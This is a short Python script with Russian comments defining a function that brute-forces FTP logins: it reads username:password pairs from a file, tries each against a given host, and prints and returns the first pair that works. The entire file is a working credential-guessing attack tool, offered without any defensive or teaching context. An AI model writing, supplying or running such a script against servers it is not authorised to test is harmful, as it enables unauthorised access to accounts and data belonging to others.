from ftplib import FTP


def ftp_bruteforce(host, credentials_file):
    """
    Выполняет брутфорс для FTP-сервера с использованием логинов и паролей из файла.
    :param host: IP-адрес или доменное имя FTP-сервера
    :param credentials_file: Путь к файлу с логинами и паролями
    """
    try:
        with open(credentials_file, "r") as file:
            credentials = file.readlines()
    except FileNotFoundError:
        print(f"Файл {credentials_file} не найден!")
        return

    for line in credentials:
        try:
            # Получаем логин и пароль из строки
            username, password = line.strip().split(":")
            # print(f"Пробуем логин: {username}, пароль: {password}")

            ftp = FTP(host)
            ftp.login(user=username, passwd=password)
            print(f"[УСПЕХ] Логин: {username}, Пароль: {password}")
            ftp.quit()
            return f"Логин: {username}, Пароль: {password}"
        except Exception as e:
            print(f"[ОШИБКА] Логин: {username}, Пароль: {password} не подошли. {e}")
            continue

    print("Брутфорс завершён. Подходящих пар логин/пароль не найдено.")
